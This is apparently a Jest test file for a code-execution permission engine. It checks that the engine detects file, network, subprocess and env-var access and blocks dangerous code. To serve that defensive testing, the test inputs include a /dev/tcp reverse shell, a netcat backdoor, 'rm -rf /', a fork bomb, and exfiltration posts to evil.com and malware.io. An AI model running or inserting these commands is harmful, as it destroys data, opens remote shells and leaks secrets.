import { PermissionEngine, CodeAnalysisResult } from '../src/core/permissions/engine';

describe('PermissionEngine', () => {
  let engine: PermissionEngine;

  beforeEach(() => {
    // Mock DB that always returns empty (no pre-approved permissions)
    const mockDb = {
      prepare: (_sql: string) => ({
        all: (..._args: any[]) => []
      })
    };
    engine = new PermissionEngine(mockDb as any);
  });

  describe('Static Analysis — File Detection', () => {
    it('detects Python file open', async () => {
      const result = await engine.analyzeCodeStatically(`open('/etc/passwd', 'r')`, 'python3.11');
      expect(result.filesAccessed).toContain('/etc/passwd');
    });

    it('detects Node.js fs operations', async () => {
      const result = await engine.analyzeCodeStatically(`fs.readFileSync('/data/config.json')`, 'node20');
      expect(result.filesAccessed).toContain('/data/config.json');
    });

    it('detects bash cat command', async () => {
      const result = await engine.analyzeCodeStatically(`cat /etc/hosts`, 'bash');
      expect(result.filesAccessed).toContain('/etc/hosts');
    });
  });

  describe('Static Analysis — Network Detection', () => {
    it('detects HTTP URLs', async () => {
      const result = await engine.analyzeCodeStatically(`fetch('https://api.evil.com/data')`, 'node20');
      expect(result.networksAccessed).toContain('api.evil.com');
    });

    it('detects Python requests', async () => {
      const result = await engine.analyzeCodeStatically(
        `requests.post('https://malware.io/exfil', data=stolen_data)`, 
        'python3.11'
      );
      expect(result.networksAccessed).toContain('malware.io');
    });

    it('detects curl commands', async () => {
      const result = await engine.analyzeCodeStatically(
        `curl https://example.com/api`, 
        'bash'
      );
      expect(result.networksAccessed).toContain('example.com');
    });
  });

  describe('Static Analysis — Subprocess Detection', () => {
    it('detects Python os.system', async () => {
      const result = await engine.analyzeCodeStatically(`os.system('whoami')`, 'python3.11');
      expect(result.subprocesses).toContain('whoami');
    });

    it('detects Node.js exec', async () => {
      const result = await engine.analyzeCodeStatically(`exec('ls -la')`, 'node20');
      expect(result.subprocesses).toContain('ls -la');
    });
  });

  describe('Static Analysis — Env Var Detection', () => {
    it('detects Python os.environ', async () => {
      const result = await engine.analyzeCodeStatically(`os.environ['AWS_SECRET_KEY']`, 'python3.11');
      expect(result.envVarsAccessed).toContain('AWS_SECRET_KEY');
    });

    it('detects Node.js process.env', async () => {
      const result = await engine.analyzeCodeStatically(`const key = process.env.DATABASE_URL`, 'node20');
      expect(result.envVarsAccessed).toContain('DATABASE_URL');
    });
  });

  describe('Threat Detection — Critical', () => {
    it('detects rm -rf /', async () => {
      const result = await engine.analyzeCodeStatically(`rm -rf /`, 'bash');
      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
      expect(critical.length).toBeGreaterThan(0);
      expect(critical.some(p => p.pattern === 'destructive_command')).toBe(true);
    });

    it('detects fork bomb', async () => {
      const result = await engine.analyzeCodeStatically(`:(){ :|:& };:`, 'bash');
      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
      expect(critical.some(p => p.pattern === 'fork_bomb')).toBe(true);
    });

    it('detects reverse shell', async () => {
      const result = await engine.analyzeCodeStatically(
        `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`, 
        'bash'
      );
      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
      expect(critical.length).toBeGreaterThan(0);
    });

    it('detects netcat backdoor', async () => {
      const result = await engine.analyzeCodeStatically(`nc -e /bin/bash 10.0.0.1 4242`, 'bash');
      const critical = result.suspiciousPatterns.filter(p => p.severity === 'critical');
      expect(critical.some(p => p.pattern === 'netcat_shell')).toBe(true);
    });
  });

  describe('Threat Detection — High', () => {
    it('detects eval()', async () => {
      const result = await engine.analyzeCodeStatically(`eval("malicious_code()")`, 'python3.11');
      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
      expect(high.some(p => p.pattern === 'dynamic_code_execution')).toBe(true);
    });

    it('detects chmod 777', async () => {
      const result = await engine.analyzeCodeStatically(`chmod 777 /tmp/script.sh`, 'bash');
      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
      expect(high.some(p => p.pattern === 'insecure_permissions')).toBe(true);
    });

    it('detects base64 decoding', async () => {
      const result = await engine.analyzeCodeStatically(`atob("dGVzdA==")`, 'node20');
      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
      expect(high.some(p => p.pattern === 'base64_decode')).toBe(true);
    });

    it('detects crypto miner patterns', async () => {
      const result = await engine.analyzeCodeStatically(`connect("stratum+tcp://pool.mining.com")`, 'python3.11');
      const high = result.suspiciousPatterns.filter(p => p.severity === 'high');
      expect(high.some(p => p.pattern === 'crypto_miner')).toBe(true);
    });
  });

  describe('Risk Scoring', () => {
    it('gives low risk to safe code', async () => {
      const result = await engine.analyzeCodeStatically(`print("hello world")`, 'python3.11');
      expect(result.riskScore).toBeLessThan(20);
    });

    it('gives high risk to dangerous code', async () => {
      const result = await engine.analyzeCodeStatically(
        `os.system('rm -rf /')\nrequests.post('https://evil.com', data=open('/etc/passwd').read())`, 
        'python3.11'
      );
      expect(result.riskScore).toBeGreaterThan(50);
    });
  });

  describe('Permission Check', () => {
    it('blocks code needing approval when no permissions pre-configured', async () => {
      const result = await engine.checkPermissions(
        { id: 'test-1', userId: 'user-1', code: `open('/etc/passwd').read()`, language: 'python3.11' },
        'executor'
      );
      expect(result.canExecute).toBe(false);
      expect(result.requiresApprovalFor.length).toBeGreaterThan(0);
    });

    it('blocks critical threats without even queuing for approval', async () => {
      const result = await engine.checkPermissions(
        { id: 'test-2', userId: 'user-1', code: `os.system('rm -rf /')`, language: 'python3.11' },
        'admin'
      );
      expect(result.canExecute).toBe(false);
      expect(result.blocked).toBe(true);
    });

    it('allows safe code', async () => {
      const result = await engine.checkPermissions(
        { id: 'test-3', userId: 'user-1', code: `print(2 + 2)`, language: 'python3.11' },
        'executor'
      );
      expect(result.canExecute).toBe(true);
    });

    it('rejects oversized code', async () => {
      const bigCode = 'x'.repeat(200 * 1024); // 200KB
      const result = await engine.checkPermissions(
        { id: 'test-4', userId: 'user-1', code: bigCode, language: 'python3.11' },
        'executor'
      );
      expect(result.canExecute).toBe(false);
      expect(result.blocked).toBe(true);
    });
  });
});
